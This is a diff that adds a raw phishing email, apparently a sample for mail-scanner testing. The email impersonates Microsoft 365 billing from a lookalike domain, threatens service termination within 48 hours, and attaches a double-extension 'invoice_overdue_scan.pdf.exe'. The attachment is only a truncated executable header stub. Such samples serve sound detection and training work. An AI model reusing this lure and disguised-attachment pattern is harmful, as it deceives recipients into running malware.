@@ -1,0 +1,43 @@
+Received: from mail-scanner.edge-defense.com (mail-scanner.edge-defense.com [198.51.100.110])
+	by mail.company.com (Postfix) with ESMTPS id 3KbP19827z
+	for <accounting@company.com>; Wed, 28 Aug 2026 11:15:00 +0000 (UTC)
+Received: from vps-mailer.bulletproof-direct.top (vps-mailer.bulletproof-direct.top [45.154.255.88])
+	by mail-scanner.edge-defense.com (Postfix) with ESMTP id 7LmV29481q
+	for <accounting@company.com>; Wed, 28 Aug 2026 11:14:55 +0000 (UTC)
+Authentication-Results: mail-scanner.edge-defense.com;
+	dkim=none;
+	spf=fail smtp.mailfrom=billing@micros0ft-support-portal.top;
+	dmarc=fail header.from=micros0ft-support-portal.top
+From: "Microsoft 365 Support Team" <billing@micros0ft-support-portal.top>
+Reply-To: "Billing Resolution Desk" <billing-desk@payment-gateway-routing.net>
+To: "Accounting Department" <accounting@company.com>
+Subject: Past Due Invoice Notice #INV-92819 - Action Required
+Date: Wed, 28 Aug 2026 11:14:50 +0000
+Message-ID: <INV-20260828-9912003@micros0ft-support-portal.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============7891234567890123456=="
+
+--===============7891234567890123456==
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+Dear Customer,
+
+Please find attached the overdue invoice for your corporate Microsoft 365 licensing renewal.
+Failure to settle the outstanding balance within 48 hours will result in automatic service termination.
+
+Please review the attached document immediately: invoice_overdue_scan.pdf.exe
+
+Regards,
+Microsoft Billing Resolution Services
+
+--===============7891234567890123456==
+Content-Type: application/octet-stream; name="invoice_overdue_scan.pdf.exe"
+Content-Disposition: attachment; filename="invoice_overdue_scan.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAA=
+
+--===============7891234567890123456==--
